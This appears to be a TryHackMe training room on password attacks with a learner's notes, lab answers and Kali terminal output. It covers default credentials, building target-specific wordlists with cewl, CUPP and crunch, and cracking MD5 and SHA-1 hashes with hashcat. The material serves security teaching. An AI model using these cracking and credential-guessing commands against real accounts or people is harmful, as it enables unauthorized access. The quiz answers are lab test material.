---
This room introduces the fundamental techniques to perform a successful password attack against various services and scenarios.
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/0f6134d4b49d4b2fb8d5303371460ffa.png)

###  Introduction 

This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss:


    Password profiling
    Password attacks techniques
    Online password attacks

What is a password?

Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords!

A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password, 123456, 111111, and much more. Here are the [top 100 and most common](https://techlabuzz.com/top-100-most-common-passwords/) and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@).

Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy.

How secure are passwords?

Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others.

To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the [Sony breach](https://www.techdirt.com/2014/12/05/shocking-sony-learned-no-password-lessons-after-2011-psn-hack/) in 2014. 

Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks.


Learn about password attacking techniques in the next task!
*No answer needed*

### Password Attacking Techniques 

![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/964652939b29903c091e3c03f867aaf0.png)

Password Attack Techniques

In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine.

Password Cracking vs. Password Guessing

This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper.

Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools.

Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing:

    Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.
    Password cracking is a technique performed locally or on systems controlled by the attacker.


Which type of password attack is performed locally?
*Password cracking*

###  Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists

Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.

Default Passwords

Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin, admin:123456, etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin.

Here are some website lists that provide default passwords for various products.

    https://cirt.net/passwords
    https://default-password.info/
    https://datarecovery.com/rd/default-passwords/


Weak Passwords
Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists :

    https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords.
    SecLists - A huge collection of all kinds of lists, not only for password cracking.

Leaked Passwords

Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost, elitehacker,hak5, Hotmail, PhpBB companies' leaks:

    SecLists/Passwords/Leaked-Databases

Combined wordlists

Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat:

```cewl

           
cat file1.txt file2.txt file3.txt > combined_list.txt

```

To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:

```cewl
    
sort combined_list.txt | uniq -u > cleaned_combined_list.txt

```

Customized Wordlists

Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! 

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:

```cewl
   
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs

```

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. 

Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!

Username Wordlists

Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames.

    {first name}: john
    {last name}: smith
    {first name}{last name}:  johnsmith 
    {last name}{first name}:  smithjohn  
    first letter of the {first name}{last name}: jsmith 
    first letter of the {last name}{first name}: sjohn  
    first letter of the {first name}.{last name}: j.smith 
    first letter of the {first name}-{last name}: j-smith 
    and so on

Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name.

```
Usernames

           
user@thm$ git clone https://github.com/therodri2/username_generator.git
Cloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.

user@thm$ cd username_generator

        
```

Using python3 username_generator.py -h shows the tool's help message and optional arguments.

```
Usernames

           
user@thm$ python3 username_generator.py -h
usage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default

        
```

Now let's create a wordlist that contains the full name John Smith to a text file. Then, we'll run the tool to generate the possible combinations of the given full name.

```
Usernames

           
user@thm$ echo "John Smith" > users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn

        
```

![[Pasted image 20220910121328.png]]

This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice!


What is the Juniper Networks ISG 2000 default password?
Check the following website: https://default-password.info/juniper/isg2000. Answer as username:password

*netscreen:netscreen*

![[Pasted image 20220910120247.png]]

###  Password Profiling #2 - Keyspace Technique and CUPP

Keyspace Technique

Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch, we can specify numerous options, including min, max, and options as follows:

```

crunch

           
user@thm$ crunch -h
crunch version 3.6

Crunch can create a wordlist based on the criteria you specify.  
The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch   [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.

```

The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. 

```

crunch

           
user@thm$ crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: xx
crunch: 100% completed generating output

        


```

Here is a snippet of the output:

```

crunch

           
user@thm$ cat crunch.txt
00
01
02
03
04
0a
0b
0c
0d
10
.
.
.
cb
cc
cd
d0
d1
d2
d3
d4
da
db
dc
dd

        


```

It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters:

crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words.

crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers:

```

crunch

           
user@thm$  crunch 6 6 -t pass%%
Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03

        
```

CUPP - Common User Passwords Profiler

CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode, which substitutes the letters a, i,e, t, o, s, g, z  with numbers. For example, replace a  with 4  or i with 1. For more information about the tool, please visit the GitHub repo here.

To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows:

```

CUPP

           
user@thm$  git clone https://github.com/Mebus/cupp.git
Cloning into 'cupp'...
remote: Enumerating objects: 237, done.
remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.
Resolving deltas: 100% (125/125), done.

        
```

Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options.

```

CUPP

           
user@thm$  python3 cupp.py
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified
                     databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)

        
```

CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key.

```

CUPP

           
user@thm$  python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: 
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
> Hyperspeed Print? (Y/n)

        
```

ِAs a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows:

```

CUPP

           
user@thm$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number:

        
```

Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!

Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -l option. 

```

CUPP

           
user@thm$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.

        
```

```
┌──(kali㉿kali)-[~]
└─$ crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 81 

crunch: 100% completed generating output

```

Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? (Check the number of lines when you execute the provided command.)
*81*

What is the crunch command to generate a list containing THM@! and output to a filed named tryhackme.txt? (crunch 5 5 -t "option" -o tryhackme.txt)
*crunch 5 5 -t "THM^^" -o tryhackme.txt* (^ special characters)

###  Offline Attacks - Dictionary and Brute-Force

This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.
Dictionary attack

A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat, which is a popular tool to crack hashes.

Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c, and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum:

1- What type of hash is this?
2- What wordlist will we be using? Or what type of attack mode could we use?

To identify the type of hash, we could a tool such as hashid or hash-identifier. For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).

```
Dictionary attack

           
user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> 123123

Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021

        
```

-a 0  sets the attack mode to a dictionary attack

-m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack

We run hashcat with --show option to show the cracked value if the hash has been cracked: 

```
Dictionary attack

           
user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
f806fc5a2a0d5ba2471600758452799c:rockyou

        
```

As a result, the cracked value is rockyou.
Brute-Force attack

Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords.

In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0, admin1, .. admin9999.

For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options.

```
Brute-Force attack

           
user@machine$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff

        
```

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. 

```
Brute-Force attack

           
user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..

        
```

-a 3  sets the attacking mode as a brute-force attack

?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

--stdout print the result to the terminal

Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.

```
Brute-Force attack

           
user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021

        
```


Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type? (Use hashid or hash-identifer)

```
hash-identifier 8d6e34f987851aa599257d3831a1af040886842f
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

```
*SHA-1*

Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist. (-m 100)

```
┌──(kali㉿kali)-[~]
└─$ hashcat -h | grep "SHA1" 
    100 | SHA1     
```

```
-a 0 dictionary attack
-a 3 brute force attack
-m 0 md5
-m 100 sha1

┌──(kali㉿kali)-[~]
└─$ hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.                                                                        
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

8d6e34f987851aa599257d3831a1af040886842f:sunshine         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 8d6e34f987851aa599257d3831a1af040886842f
Time.Started.....: Sat Sep 10 13:48:02 2022 (0 secs)
Time.Estimated...: Sat Sep 10 13:48:02 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   340.7 kH/s (0.28ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 26%

Started: Sat Sep 10 13:47:34 2022
Stopped: Sat Sep 10 13:48:05 2022

```
*sunshine*

	Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] (XXXX where X is number!)

```
┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.                                                                        
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).                                                                       
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

e48e13207341b6bffb7fb1622282247b:1337                     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e48e13207341b6bffb7fb1622282247b
Time.Started.....: Sat Sep 10 13:49:59 2022 (0 secs)
Time.Estimated...: Sat Sep 10 13:49:59 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2478.7 kH/s (0.46ms) @ Accel:256 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidate.Engine.: Device Generator
Candidates.#1....: 1234 -> 6764
Hardware.Mon.#1..: Util: 27%

Started: Sat Sep 10 13:49:24 2022
Stopped: Sat Sep 10 13:50:01 2022

```

*1337*

### Offline Attacks - Rule-Based

Rule-Based attacks

	Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on.

	For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:

```
Rule-based attack

           
user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9

        
```

```
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules"
[List.Rules:None]
[List.Rules:Drop]
[List.Rules:JumboSingle]
[List.Rules:Single]
.include [List.Rules:JumboSingle]
[List.Rules:Extra]
[List.Rules:Wordlist]
[List.Rules:NT]
[List.Rules:ShiftToggle]
[List.Rules:Multiword]
[List.Rules:PhrasePreprocess]
[List.Rules:Phrase]
[List.Rules:PhraseCaseOne]
[List.Rules:PhraseWrap]
[List.Rules:Split]
[List.Rules:OldOffice]
[List.Rules:o1]
[List.Rules:o2]
[List.Rules:o3]
[List.Rules:o]
.include [List.Rules:o1]
.include [List.Rules:o2]
[List.Rules:i1]
[List.Rules:i2]
[List.Rules:i3]
[List.Rules:i]
.include [List.Rules:i1]
.include [List.Rules:i2]
[List.Rules:oi]
.include [List.Rules:o1]
.include [List.Rules:i1]
.include [List.Rules:o2]
.include [List.Rules:i2]
[List.Rules:T9]
[List.Rules:best64]
[List.Rules:d3ad0ne]
[List.Rules:dive]
[List.Rules:InsidePro]
[List.Rules:T0XlC]
[List.Rules:rockyou-30000]
[List.Rules:specific]
[List.Rules:hashcat]
.include [List.Rules:best64]
.include [List.Rules:d3ad0ne]
.include [List.Rules:dive]
.include [List.Rules:InsidePro]
.include [List.Rules:T0XlC]
.include [List.Rules:rockyou-30000]
.include [List.Rules:specific]
[List.Rules:passphrase-rule1]
[List.Rules:passphrase-rule2]
[List.Rules:Loopback]
.include [List.Rules:ShiftToggle]
.include [List.Rules:Split]
[List.Rules:Single-Extra]
.include [List.Rules:Single]
.include [List.Rules:Extra]
.include [List.Rules:OldOffice]
[List.Rules:Jumbo]
.include [List.Rules:Single-Extra]
.include [List.Rules:Wordlist]
.include [List.Rules:ShiftToggle]
.include [List.Rules:Multiword]
.include [List.Rules:best64]
.include [List.Rules:UnicodeSubstitution]
[List.Rules:All]
.include [List.Rules:Jumbo]
.include [List.Rules:KoreLogic]
.include [List.Rules:T9]
.include [List.Rules:hashcat]
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"."
cut: you must specify a list of bytes, characters, or fields
Try 'cut --help' for more information.
                                                                          
